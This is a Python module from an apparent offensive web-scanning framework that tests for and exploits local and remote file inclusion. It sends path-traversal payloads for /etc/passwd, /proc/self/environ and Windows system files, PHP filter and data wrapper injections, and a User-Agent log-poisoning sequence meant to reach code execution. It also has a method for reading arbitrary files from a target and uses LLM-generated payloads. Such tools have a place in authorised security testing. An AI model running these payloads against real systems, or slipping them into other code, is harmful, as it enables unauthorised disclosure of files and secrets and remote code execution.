#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - LFI/RFI Module
Local/Remote File Inclusion detection and exploitation
"""

import re
import base64


from config import Payloads, Colors


class LFIModule:
    """LFI/RFI Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "LFI/RFI"
        
        # File content indicators
        self.file_indicators = {
            '/etc/passwd': [
                'root:x:',
                'bin:x:',
                'daemon:x:',
                '/bin/bash',
                '/bin/sh',
            ],
            'win.ini': [
                'for 16-bit app support',
                '[extensions]',
                '[fonts]',
                '[mci extensions]',
            ],
            'phpinfo': [
                'phpinfo()',
                'PHP Version',
                'System',
                'Build Date',
            ],
            'access.log': [
                'GET /',
                'POST /',
                'HTTP/1.1',
                'Mozilla/',
            ],
        }
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for LFI/RFI"""
        # Test LFI
        self._test_lfi(url, method, param, value)
        
        # Test RFI
        self._test_rfi(url, method, param, value)
        
        # Test log poisoning
        self._test_log_poisoning(url, method, param, value)
        
        # Test PHP wrappers
        self._test_php_wrappers(url, method, param, value)
        
        # Test PHP filter chains
        self._test_php_filter_chains(url, method, param, value)
        
        # Test Windows paths
        self._test_windows_paths(url, method, param, value)
        
        # Test advanced log poisoning
        self._test_log_poisoning_advanced(url, method, param, value)
        
        # Test /proc filesystem disclosure
        self._test_proc_filesystem(url, method, param, value)

        # LLM-generated adaptive LFI payloads
        self._test_llm_payloads(url, method, param, value)

    def _test_llm_payloads(self, url: str, method: str, param: str, value: str):
        """Test with LLM-generated file inclusion payloads.

        Uses Qwen2.5-7B to produce context-aware LFI payloads when
        ``--local-llm`` is active.
        """
        ai = getattr(self.engine, 'ai', None)
        if ai is None:
            return
        llm_payloads = ai.get_llm_payloads('lfi', param)
        if not llm_payloads:
            return

        for payload in llm_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                resp_text = response.text
                for file_type, indicators in self.file_indicators.items():
                    indicator_count = sum(1 for ind in indicators if ind in resp_text)
                    if indicator_count >= 2:
                        from core.engine import Finding
                        finding = Finding(
                            technique="LFI (AI-generated)",
                            url=url,
                            severity='HIGH',
                            confidence=0.80,
                            param=param,
                            payload=payload,
                            evidence=f"AI payload triggered file content ({file_type})",
                        )
                        self.engine.add_finding(finding)
                        return
            except Exception:
                continue
    
    def _test_php_filter_chains(self, url: str, method: str, param: str, value: str):
        """Test PHP filter chains for source disclosure"""
        import base64 as b64mod
        payloads = [
            'php://filter/read=convert.base64-encode/resource=index.php',
            'php://filter/read=convert.base64-encode/resource=../config.php',
            'php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd',
        ]
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                text = response.text
                is_b64 = False
                try:
                    decoded = b64mod.b64decode(text.strip()).decode('utf-8', errors='ignore')
                    if '<?php' in decoded or 'function' in decoded:
                        is_b64 = True
                except Exception:
                    pass
                if is_b64 or '<?php' in text or 'phpinfo' in text.lower():
                    from core.engine import Finding
                    finding = Finding(
                        technique="LFI (PHP Filter Chain)", url=url,
                        severity='HIGH', confidence=0.9, param=param,
                        payload=payload,
                        evidence="PHP source code leaked via filter chain",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def _test_windows_paths(self, url: str, method: str, param: str, value: str):
        """Test Windows file inclusion paths"""
        payloads = [
            '..\\..\\..\\..\\..\\windows\\win.ini',
            'C:\\boot.ini',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
        ]
        indicators = {
            'win.ini': ['for 16-bit app support', '[extensions]'],
            'boot.ini': ['boot loader', 'operating systems'],
            'hosts': ['localhost', '127.0.0.1'],
        }
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                text = response.text.lower()
                for inds in indicators.values():
                    for ind in inds:
                        if ind.lower() in text:
                            from core.engine import Finding
                            finding = Finding(
                                technique="LFI (Windows Path)", url=url,
                                severity='HIGH', confidence=0.85, param=param,
                                payload=payload,
                                evidence=f"Windows file content: {ind}",
                            )
                            self.engine.add_finding(finding)
                            return
            except Exception:
                continue

    def _test_log_poisoning_advanced(self, url: str, method: str, param: str, value: str):
        """Advanced log poisoning via User-Agent"""
        poison_ua = '<?php echo "ATOMIC_LOG_POISON_TEST"; ?>'
        try:
            self.requester.request(url, 'GET', headers={'User-Agent': poison_ua})
        except Exception:
            pass
        log_paths = ['/var/log/apache2/access.log', '/var/log/nginx/access.log']
        for log_path in log_paths:
            for trav in [f'....//....//....//..../{log_path}', log_path]:
                try:
                    data = {param: trav}
                    response = self.requester.request(url, method, data=data)
                    if not response:
                        continue
                    if 'ATOMIC_LOG_POISON_TEST' in response.text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="LFI (Log Poisoning → RCE)", url=url,
                            severity='CRITICAL', confidence=0.95, param=param,
                            payload=trav,
                            evidence="Log poisoning confirmed: injected PHP executed",
                        )
                        self.engine.add_finding(finding)
                        return
                except Exception:
                    continue

    def _test_proc_filesystem(self, url: str, method: str, param: str, value: str):
        """Test /proc filesystem for information disclosure"""
        proc_payloads = [
            ('../../../proc/self/environ', ['PATH=', 'HOME=', 'USER=', 'SHELL=']),
            ('../../../proc/self/cmdline', ['python', 'apache', 'nginx', 'php', 'node']),
            ('../../../proc/version', ['Linux version', 'gcc', 'SMP']),
            ('../../../proc/net/tcp', ['local_address', 'rem_address', 'sl']),
            ('../../../proc/self/status', ['Name:', 'State:', 'Pid:', 'Uid:']),
        ]
        for payload, indicators in proc_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                if not response:
                    continue
                text = response.text
                match_count = sum(1 for ind in indicators if ind in text)
                if match_count >= 2:
                    from core.engine import Finding
                    finding = Finding(
                        technique="LFI (Proc Filesystem Disclosure)",
                        url=url, severity='HIGH', confidence=0.85, param=param,
                        payload=payload,
                        evidence=f"Proc file content detected: {payload}",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    def test_url(self, url: str):
        """Test URL for LFI"""
        pass
    
    def _test_lfi(self, url: str, method: str, param: str, value: str):
        """Test for Local File Inclusion"""
        payloads = Payloads.LFI_PAYLOADS
        
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                response_text = response.text
                
                # Check for file content indicators
                for file_type, indicators in self.file_indicators.items():
                    match_count = 0
                    for indicator in indicators:
                        if indicator in response_text:
                            match_count += 1
                    
                    # Require 3+ indicators for /etc/passwd (more specific),
                    # 2+ for other file types
                    min_matches = 3 if file_type == '/etc/passwd' else 2
                    if match_count >= min_matches:
                        from core.engine import Finding
                        finding = Finding(
                            technique="LFI (Local File Inclusion)",
                            url=url,
                            severity='HIGH',
                            confidence=0.9,
                            param=param,
                            payload=payload,
                            evidence=f"File content detected: {file_type}",
                        )
                        self.engine.add_finding(finding)
                        return
                        
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'LFI test error: {e}')}")
    
    def _test_rfi(self, url: str, method: str, param: str, value: str):
        """Test for Remote File Inclusion"""
        payloads = Payloads.RFI_PAYLOADS
        
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check if remote content was included
                # This is tricky to detect without a callback server
                # We'll look for common indicators
                if response.status_code == 200:
                    # Check for PHP code execution
                    if '<?php' in response.text or '<?=' in response.text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="RFI (Remote File Inclusion)",
                            url=url,
                            severity='CRITICAL',
                            confidence=0.8,
                            param=param,
                            payload=payload,
                            evidence="Remote file may have been included",
                        )
                        self.engine.add_finding(finding)
                        return
                        
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'RFI test error: {e}')}")
    
    def _test_log_poisoning(self, url: str, method: str, param: str, value: str):
        """Test for log file inclusion (log poisoning)"""
        log_paths = [
            '../../../var/log/apache2/access.log',
            '../../../var/log/apache/access.log',
            '../../../var/log/nginx/access.log',
            '../../../var/log/httpd/access.log',
            '../../../proc/self/environ',
            '../../../proc/self/cmdline',
            '../../../var/log/vsftpd.log',
            '../../../var/log/ftp.log',
        ]
        
        for log_path in log_paths:
            try:
                data = {param: log_path}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check for log content
                log_indicators = [
                    'GET /',
                    'POST /',
                    'HTTP/1.1',
                    'Mozilla/',
                    'Accept:',
                    'Host:',
                ]
                
                match_count = sum(1 for ind in log_indicators if ind in response.text)
                
                if match_count >= 3:
                    from core.engine import Finding
                    finding = Finding(
                        technique="LFI (Log Poisoning Possible)",
                        url=url,
                        severity='HIGH',
                        confidence=0.8,
                        param=param,
                        payload=log_path,
                        evidence="Log file accessible via LFI",
                    )
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'Log poisoning test error: {e}')}")
    
    def _test_php_wrappers(self, url: str, method: str, param: str, value: str):
        """Test PHP wrappers"""
        wrappers = [
            ('php://filter/read=convert.base64-encode/resource=', 'base64'),
            ('php://input', 'input'),
            ('data://text/plain,', 'data'),
            ('expect://', 'expect'),
        ]
        
        for wrapper, wtype in wrappers:
            try:
                if wtype == 'base64':
                    test_file = 'index.php'
                    payload = f"{wrapper}{test_file}"
                elif wtype == 'data':
                    payload = f"{wrapper}<?php echo 'lfi_test'; ?>"
                else:
                    continue
                
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check for successful wrapper usage
                if wtype == 'base64':
                    # Try to decode base64 response
                    try:
                        decoded = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                        if '<?php' in decoded or '<?=' in decoded:
                            from core.engine import Finding
                            finding = Finding(
                                technique="LFI (PHP Filter Wrapper)",
                                url=url,
                                severity='HIGH',
                                confidence=0.9,
                                param=param,
                                payload=payload,
                                evidence="PHP file content retrieved via wrapper",
                            )
                            self.engine.add_finding(finding)
                            return
                    except (Exception, ValueError):
                        pass
                elif wtype == 'data':
                    if 'lfi_test' in response.text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="LFI (PHP Data Wrapper)",
                            url=url,
                            severity='CRITICAL',
                            confidence=0.9,
                            param=param,
                            payload=payload,
                            evidence="PHP code execution via data wrapper",
                        )
                        self.engine.add_finding(finding)
                        return
                        
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'PHP wrapper test error: {e}')}")
    
    def exploit_read_file(self, url: str, param: str, file_path: str) -> str:
        """Attempt to read a file via LFI"""
        try:
            data = {param: f"../../../{file_path}"}
            response = self.requester.request(url, 'GET', data=data)
            
            if response:
                return response.text
        except Exception as e:
            print(f"{Colors.error(f'File read error: {e}')}")
        
        return None
